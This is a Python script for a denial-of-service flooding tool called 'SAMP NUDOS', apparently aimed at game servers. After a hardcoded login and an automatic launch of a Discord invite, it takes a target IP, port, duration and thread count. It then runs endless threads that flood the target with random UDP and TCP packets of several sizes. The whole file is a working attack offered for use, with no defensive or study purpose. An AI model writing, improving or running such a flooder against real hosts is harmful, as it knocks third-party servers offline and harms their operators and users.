import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'NUDOS' and password == 'NUDOS':
        print('You have successfully logged in Welcome to NUDOS!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[35m
      AUTHOR TOOLS : SAMP NUDOS
    ╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
    ╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
    ╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time (in seconds):"))
threads = int(input(" Number of Threads:"))

def attack_udp():
    data = random._urandom(2048)  # Increased packet size
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print(i + " UDP Attack Sent!!!")
        except:
            print("[*] UDP Attack Error!!!")

def attack_tcp_large():
    data = random._urandom(2048)  # Increased packet size for TCP
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(i + " TCP Large Attack Sent!!!")
        except:
            s.close()
            print("[*] TCP Large Attack Error!!!")

def attack_tcp_medium():
    data = random._urandom(1024)  # Standard medium size for TCP
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(i + " TCP Medium Attack Sent!!!")
        except:
            s.close()
            print("[*] TCP Medium Attack Error!!!")

def attack_tcp_small():
    data = random._urandom(512)  # Small size to keep traffic persistent
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(i + " TCP Small Attack Sent!!!")
        except:
            s.close()
            print("[*] TCP Small Attack Error!!!")

def attack_hybrid():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(i + " Hybrid Attack Sent!!!")
        except:
            s.close()
            print("[*] Hybrid Attack Error!!!")

# Start the attacks
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = attack_udp)
        th.start()
        th = threading.Thread(target = attack_tcp_large)
        th.start()
        th = threading.Thread(target = attack_tcp_medium)
        th.start()
        th = threading.Thread(target = attack_tcp_small)
        th.start()
        th = threading.Thread(target = attack_hybrid)
        th.start()
    else:
        th = threading.Thread(target = attack_tcp_small)
        th.start()
